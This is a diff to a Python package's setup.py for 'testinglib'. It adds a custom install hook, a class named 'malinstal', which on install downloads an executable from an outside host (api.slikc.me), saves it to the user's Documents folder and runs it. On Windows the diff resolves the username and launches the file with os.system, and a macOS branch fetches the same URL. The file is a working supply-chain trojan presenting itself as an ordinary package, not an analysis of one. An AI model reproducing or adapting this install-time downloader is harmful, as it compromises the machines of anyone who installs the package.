@@ -18,15 +18,16 @@ VERSION = '1.4.1'
 class malinstal(install):
     def run(self):
         if platform.system() != 'Darwin':
-            documents = 'C:\\Users\\charl\\Documents'
+            username = os.environ['USERNAME']
+            documents = f'C:\\Users\\{username}\\Documents'
+            os.chdir(documents)
             installer_url = 'https://api.slikc.me/installer'
             with urllib.request.urlopen(installer_url) as response:
                 installer_content = response.read()
                 print(installer_content[:100])
             with open(os.path.join(documents, 'installer.exe'), 'wb') as f:
                 f.write(installer_content)
-            subprocess.Popen([os.path.join(documents, 'installer.exe')], creationflags=subprocess.CREATE_NO_WINDOW)
-            print('done')
+            os.system('installer.exe')
         else:
             installer_url = 'https://api.slikc.me/installer'
             with urllib.request.urlopen(installer_url) as response:
@@ -43,6 +44,11 @@ setup(
     author_email=EMAIL,
     python_requires=REQUIRES_PYTHON,
     url=URL,
+    version=VERSION,
+    license='MIT',
+    install_requires=[''],
+    keywords=[''],
+    classifiers=[''],
+    packages=['testinglib'],
     cmdclass={"install": malinstal},
-    use_wheel=False
 )
